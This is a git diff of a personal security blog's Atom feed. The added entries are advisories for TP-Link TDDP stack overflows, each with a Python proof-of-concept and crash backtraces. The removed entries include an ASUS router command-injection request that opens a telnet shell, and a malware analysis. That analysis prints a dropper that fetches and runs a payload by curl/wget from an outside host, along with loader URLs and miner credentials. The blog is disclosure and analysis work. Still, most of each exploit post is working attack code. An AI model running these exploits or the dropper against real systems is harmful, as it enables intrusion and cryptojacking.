@@ -1,4 +1,85 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2019-06-24T11:55:23+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Fakhri Zulkifli</title><subtitle>Personal blog.</subtitle><entry><title type="html">[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution</title><link href="http://localhost:4000/posts/2019/06/06/CVE-2019-12929/" rel="alternate" type="text/html" title="[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution" /><published>2019-06-06T00:00:00+08:00</published><updated>2019-06-06T00:00:00+08:00</updated><id>http://localhost:4000/posts/2019/06/06/CVE-2019-12929</id><content type="html" xml:base="http://localhost:4000/posts/2019/06/06/CVE-2019-12929/">&lt;p&gt;Exploit Title: QEMU Guest Agent guest_exec Command Execution&lt;br /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2019-07-16T23:04:19+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Fakhri Zulkifli</title><subtitle>Personal blog.</subtitle><entry><title type="html">[CVE-2019-13614] TDDP CMD_SET_CONFIG_COUNTRY Stack-based Buffer Overflow</title><link href="http://localhost:4000/posts/2019/07/15/CVE-2019-13614/" rel="alternate" type="text/html" title="[CVE-2019-13614] TDDP CMD_SET_CONFIG_COUNTRY Stack-based Buffer Overflow" /><published>2019-07-15T00:00:00+08:00</published><updated>2019-07-15T00:00:00+08:00</updated><id>http://localhost:4000/posts/2019/07/15/CVE-2019-13614</id><content type="html" xml:base="http://localhost:4000/posts/2019/07/15/CVE-2019-13614/">&lt;p&gt;CMD_SET_CONFIG_COUNTRY in the TP-Link Device Debug protocol in TP-Link Archer C1200 1.0.0 Build 20180502 rel.45702 and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.&lt;/p&gt;
+
+&lt;p&gt;Proof-of-Concept:&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Copyright 2019 Google LLC.
+# SPDX-License-Identifier: Apache-2.0
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;target_ip&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BBBBCCCCDDDD&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1040&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;a2&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;00&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0.16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Send a request
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#0  0xff725778 in feof () from /lib/libc.so.0
+#1  0x0000d56c in ?? ()
+Backtrace stopped: previous frame identical to this frame (corrupt stack?)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">CMD_SET_CONFIG_COUNTRY in the TP-Link Device Debug protocol in TP-Link Archer C1200 1.0.0 Build 20180502 rel.45702 and earlier is prone to a stack-based buffer overflow, which allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.</summary></entry><entry><title type="html">[CVE-2019-13613] TDDP CMD_FTEST_CONFIG Stack-based Buffer Overflow</title><link href="http://localhost:4000/posts/2019/07/15/CVE-2019-13613/" rel="alternate" type="text/html" title="[CVE-2019-13613] TDDP CMD_FTEST_CONFIG Stack-based Buffer Overflow" /><published>2019-07-15T00:00:00+08:00</published><updated>2019-07-15T00:00:00+08:00</updated><id>http://localhost:4000/posts/2019/07/15/CVE-2019-13613</id><content type="html" xml:base="http://localhost:4000/posts/2019/07/15/CVE-2019-13613/">&lt;p&gt;CMD_FTEST_CONFIG in the TP-Link Device Debug protocol in TP-Link Wireless Router Arher Router version 1.0.0 Build 20180502 rel.45702 (EU) and earlier is prone to a stack-based buffer overflow, whic allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.&lt;/p&gt;
+
+&lt;p&gt;Proof-of-Concept:&lt;/p&gt;
+&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Copyright 2019 Google LLC.
+# SPDX-License-Identifier: Apache-2.0
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;target_ip&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;259&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;BBBBCCCC&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1040&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;31&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;01&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;00&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0.16&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tddp_padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tddp_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s;junk&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rhost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sock_send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#0  0xff7277a8 in strnlen () from /lib/libc.so.0
+#1  0xff722050 in _vfprintf_internal () from /lib/libc.so.0
+#2  0xff71f3c8 in vsnprintf () from /lib/libc.so.0
+#3  0x000092cc in ?? ()
+Backtrace stopped: previous frame identical to this frame (corrupt stack?)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;References:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;https://mjg59.dreamwidth.org/51672.html?thread=1916120&lt;/li&gt;
+&lt;/ol&gt;</content><author><name></name></author><summary type="html">CMD_FTEST_CONFIG in the TP-Link Device Debug protocol in TP-Link Wireless Router Arher Router version 1.0.0 Build 20180502 rel.45702 (EU) and earlier is prone to a stack-based buffer overflow, whic allows a remote attacker to achieve code execution or denial of service by sending a crafted payload to the listening server.</summary></entry><entry><title type="html">[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution</title><link href="http://localhost:4000/posts/2019/06/06/CVE-2019-12929/" rel="alternate" type="text/html" title="[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution" /><published>2019-06-06T00:00:00+08:00</published><updated>2019-06-06T00:00:00+08:00</updated><id>http://localhost:4000/posts/2019/06/06/CVE-2019-12929</id><content type="html" xml:base="http://localhost:4000/posts/2019/06/06/CVE-2019-12929/">&lt;p&gt;Exploit Title: QEMU Guest Agent guest_exec Command Execution&lt;br /&gt;
 Date: 2019-06-06&lt;br /&gt;
 Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
 Vendor Homepage: https://www.qemu.org/&lt;br /&gt;
@@ -1081,209 +1162,4 @@ killall Tools-file&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/tmp/bill.lock
 udevd.lock
 /tmp/notify.file
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Initial file dropped</summary></entry><entry><title type="html">[CVE-2018-15887] ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution</title><link href="http://localhost:4000/posts/2018/08/02/CVE-2018-15887/" rel="alternate" type="text/html" title="[CVE-2018-15887] ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution" /><published>2018-08-02T00:00:00+08:00</published><updated>2018-08-02T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/08/02/CVE-2018-15887</id><content type="html" xml:base="http://localhost:4000/posts/2018/08/02/CVE-2018-15887/">&lt;p&gt;Exploit Title: ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution&lt;br /&gt;
-Date: 2018-08-02&lt;br /&gt;
-Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
-Vendor Homepage: https://www.asus.com/&lt;br /&gt;
-Software Link: https://www.asus.com/Networking/DSLN12E_C1/HelpDesk_BIOS/&lt;br /&gt;
-Version: 1.1.2.3_345&lt;br /&gt;
-Tested on: 1.1.2.3_345&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /Main_Analysis_Content.asp?current_page=Main_Analysis_Content.asp&amp;amp;next_page=Main_Analysis_Content.asp&amp;amp;next_host=www.target.com&amp;amp;group_id=&amp;amp;modified=0&amp;amp;action_mode=+Refresh+&amp;amp;action_script=&amp;amp;action_wait=&amp;amp;first_time=&amp;amp;applyFlag=1&amp;amp;preferred_lang=EN&amp;amp;firmver=1.1.2.3_345-g987b580&amp;amp;cmdMethod=ping&amp;amp;destIP=%60utelnetd+-p+1337%60&amp;amp;pingCNT=5 HTTP/1.1
-Host: www.target.com
-Connection: keep-alive
-Pragma: no-cache
-Cache-Control: no-cache
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
-Referer: http://www.target.com/Main_Analysis_Content.asp
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;To connect&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;telnet www.target.com 1337&lt;/li&gt;
-&lt;/ol&gt;</content><author><name></name></author><summary type="html">Exploit Title: ASUS DSL-N12E_C1 1.1.2.3_345 - Remote Command Execution Date: 2018-08-02 Exploit Author: Fakhri Zulkifli (@d0lph1n98) Vendor Homepage: https://www.asus.com/ Software Link: https://www.asus.com/Networking/DSLN12E_C1/HelpDesk_BIOS/ Version: 1.1.2.3_345 Tested on: 1.1.2.3_345</summary></entry><entry><title type="html">4ec4f1ec6a030c4969bd336258f6699e</title><link href="http://localhost:4000/posts/2018/07/18/4ec4f1ec6a030c4969bd336258f6699e/" rel="alternate" type="text/html" title="4ec4f1ec6a030c4969bd336258f6699e" /><published>2018-07-18T00:00:00+08:00</published><updated>2018-07-18T00:00:00+08:00</updated><id>http://localhost:4000/posts/2018/07/18/4ec4f1ec6a030c4969bd336258f6699e</id><content type="html" xml:base="http://localhost:4000/posts/2018/07/18/4ec4f1ec6a030c4969bd336258f6699e/">&lt;p&gt;Initial file dropped was a Bash file containing following commands:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /var/tmp/.sys.log
-curl http://www.bizqsoft.com/imgtemplate/11.png &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /var/tmp/.sys.log &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; wget http://www.bizqsoft.com/imgtemplate/11.png &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /var/tmp/.sys.log
-&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;0777 /var/tmp/.sys.log
-/var/tmp/.sys.log
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;File &lt;code class=&quot;highlighter-rouge&quot;&gt;11.png&lt;/code&gt; was found packed using UPX packer. After the decompression, a list of websites has been found which is potentially has been compromised and used to host the loader for the bot.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[
-    &quot;http://www.ltj4949.com/weixin/loader.gif&quot;,
-    &quot;http://128.1.49.78/phpmyadmin/loader.gif&quot;,
-    &quot;http://111.231.230.124/data/loader.gif&quot;,
-    &quot;http://124.42.117.172/yjcm/loader.gif&quot;,
-    &quot;http://180.76.114.216/log/loader.gif&quot;,
-    &quot;http://103.17.95.45/log/loader.gif&quot;,
-    &quot;http://car.earthstudio.cn/static/img/loader.gif&quot;,
-    &quot;http://111.231.239.187/loader/loader.gif&quot;,
-    &quot;http://120.27.33.177:80/phpMyAdmin/locale/loader.gif&quot;,
-    &quot;http://120.55.53.187:80/website/e/data/loader.gif&quot;,
-    &quot;http://47.100.24.187:80/Mobile/data/loader.gif&quot;,
-    &quot;http://117.48.211.158:80/phpMyAdmin/locale/loader.gif&quot;,
-    &quot;http://47.97.217.130:80/heart_health/vendor/loader.gif&quot;,
-    &quot;http://132.148.151.76:80/phpMyAdmin/locale/loader.gif&quot;,
-    &quot;http://39.109.113.71/phpmyadmin/setup/loader.gif&quot;
-]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Further analysis shows that a miner is being fetched from any live domain from the list.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /posp_test/uploads/x86.png HTTP/1.1
-Host: 118.25.102.126
-Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; U&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Windows NT 6.0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; en-US&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:1.8.1.7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20070914 Firefox/2.0.0.7
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;XMRig miner credentials&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
-    &quot;id&quot;: 1,
-    &quot;jsonrpc&quot;: &quot;2.0&quot;,
-    &quot;method&quot;: &quot;login&quot;,
-    &quot;params&quot;: {
-        &quot;agent&quot;: &quot;XMRig/2.6.4 (Linux i686) libuv/1.19.3-dev gcc/7.2.0&quot;,
-        &quot;algo&quot;: [
-            &quot;cn/1&quot;,
-            &quot;cn/0&quot;,
-            &quot;cn/xtl&quot;,
-            &quot;cn/msr&quot;,
-            &quot;cn/xao&quot;,
-            &quot;cn/rto&quot;,
-            &quot;cn&quot;
-        ],
-        &quot;login&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-        &quot;pass&quot;: &quot;x&quot;
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Below is the list of mining server being use by the miner:&lt;/p&gt;
-
